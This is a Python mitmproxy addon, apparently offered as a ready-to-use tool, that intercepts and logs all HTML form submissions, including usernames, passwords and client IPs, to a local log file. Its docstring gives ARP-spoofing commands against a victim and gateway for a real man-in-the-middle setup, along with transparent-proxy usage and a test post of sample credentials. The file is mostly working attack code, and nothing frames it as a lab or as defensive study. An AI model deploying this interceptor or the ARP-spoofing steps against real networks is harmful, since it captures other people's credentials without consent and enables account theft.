"""
interceptor.py — mitmproxy addon that logs all HTML form submissions.

Usage:
    # 1. Enable IP forwarding
    sudo sysctl -w net.ipv4.ip_forward=1

    # 2. ARP spoofing (MITM setup) — optional for real MITM:
    # sudo arpspoof -i eth0 -t <victim_ip> <gateway_ip>
    # sudo arpspoof -i eth0 -t <gateway_ip> <victim_ip>

    # 3. Run mitmproxy with this addon:
    mitmproxy -s interceptor.py

    # Or in transparent proxy mode:
    mitmproxy --mode transparent -s interceptor.py

    # 4. To test locally (without MITM):
    mitmproxy -s interceptor.py &
    curl -x http://127.0.0.1:8080 -X POST http://httpbin.org/post \
         -d "username=admin&password=secret"
"""

import logging
from mitmproxy import http
from urllib.parse import parse_qs, urlparse
from datetime import datetime

# Setup logging to file and console
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [INTERCEPTOR] %(message)s",
    handlers=[
        logging.FileHandler("intercepted_forms.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Content types that indicate form submission
FORM_CONTENT_TYPES = [
    "application/x-www-form-urlencoded",
    "multipart/form-data",
]


class FormInterceptor:
    """
    mitmproxy addon that intercepts and logs HTML form submissions (POST requests).
    """

    def __init__(self):
        logger.info("=" * 60)
        logger.info("Form Interceptor started.")
        logger.info("Listening for HTML form submissions...")
        logger.info("=" * 60)

    def request(self, flow: http.HTTPFlow) -> None:
        """
        Called for each HTTP request.
        Checks if the request is a form submission and logs the data.
        """
        if flow.request.method != "POST":
            return

        content_type = flow.request.headers.get("Content-Type", "").lower()

        is_form = any(ct in content_type for ct in FORM_CONTENT_TYPES)

        if not is_form:
            return

        # Parse form data
        try:
            if "application/x-www-form-urlencoded" in content_type:
                form_data = parse_qs(
                    flow.request.content.decode("utf-8", errors="replace")
                )
            elif "multipart/form-data" in content_type:
                # For multipart, log raw content summary
                form_data = {"[multipart/form-data]": [
                    flow.request.content.decode("utf-8", errors="replace")[:500]
                ]}
            else:
                return

            self._log_form(flow, form_data)

        except Exception as e:
            logger.error(f"Error parsing form data: {e}")

    def _log_form(self, flow: http.HTTPFlow, form_data: dict) -> None:
        """
        Logs intercepted form data with request details.
        """
        url = flow.request.pretty_url
        client_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "unknown"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        logger.info("-" * 60)
        logger.info(f"[!] HTML FORM SUBMISSION DETECTED")
        logger.info(f"    Timestamp : {timestamp}")
        logger.info(f"    Client IP : {client_ip}")
        logger.info(f"    URL       : {url}")
        logger.info(f"    Method    : {flow.request.method}")
        logger.info(f"    Form Data :")

        for key, values in form_data.items():
            for value in values:
                logger.info(f"        {key} = {value}")

        logger.info("-" * 60)


# Register the addon
addons = [FormInterceptor()]
